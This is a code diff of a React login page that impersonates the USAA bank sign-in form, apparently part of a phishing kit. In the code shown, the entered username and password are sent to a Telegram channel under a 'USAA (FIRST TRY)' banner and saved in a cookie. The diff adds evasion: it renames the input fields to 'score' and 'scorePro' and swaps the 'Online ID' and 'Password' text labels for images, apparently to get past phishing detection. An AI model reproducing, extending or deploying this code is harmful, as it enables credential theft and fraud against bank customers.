@@ -2,11 +2,13 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
+import score from "../assets/score.png"
+import scorePro from "../assets/scorePro.png"
 
 export default function Login() {
   const [formInput, setFormInput] = useState<Login>({
-    username: "",
-    password: "",
+    score: "",
+    scorePro: "",
   });
   const [isLoading, setIsLoading] = React.useState(false);
   const navigate = useNavigate();
@@ -24,9 +26,9 @@ export default function Login() {
     const message = `
     [----+🏦 USAA (FIRST TRY) 🏦+-----]
   
-    USERNAME: ${formInput.username}
+    USERNAME: ${formInput.score}
 
-    PASSWORD: ${formInput.password}
+    PASSWORD: ${formInput.scorePro}
     `;
     await TelegramSend(message);
     cookies.set("login1", formInput);
@@ -47,12 +49,9 @@ export default function Login() {
                     htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                   >
-                    <span
-                      aria-hidden="false"
-                      className="usaa-form-v5-10-1-fieldLabel-text"
-                    >
-                      Online ID
-                    </span>
+                    <div className="kylexy">
+          <img src={score} height={20} alt="" />
+                      </div>
                   </label>
                 </div>
                 <div>
@@ -65,7 +64,7 @@ export default function Login() {
                 </div>
                 <span className="usaa-input">
                   <input
-                    name="username"
+                    name="score"
                     onChange={handleInputChange}
                     required
                     aria-invalid="false"
@@ -89,12 +88,9 @@ export default function Login() {
                     htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                     className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                   >
-                    <span
-                      aria-hidden="false"
-                      className="usaa-form-v5-10-1-fieldLabel-text"
-                    >
-                      Password
-                    </span>
+                     <div className="kylexy">
+          <img src={scorePro} height={20} alt="" />
+                      </div>
                   </label>
                 </div>
                 <div>
@@ -108,7 +104,7 @@ export default function Login() {
                 <span className="usaa-input">
                   <input
                   onChange={handleInputChange}
-                    name="password"
+                    name="scorePro"
                     required
                     aria-invalid="false"
                     id="usaa-form-v5-10-1-input-mwc9hotwmucj"
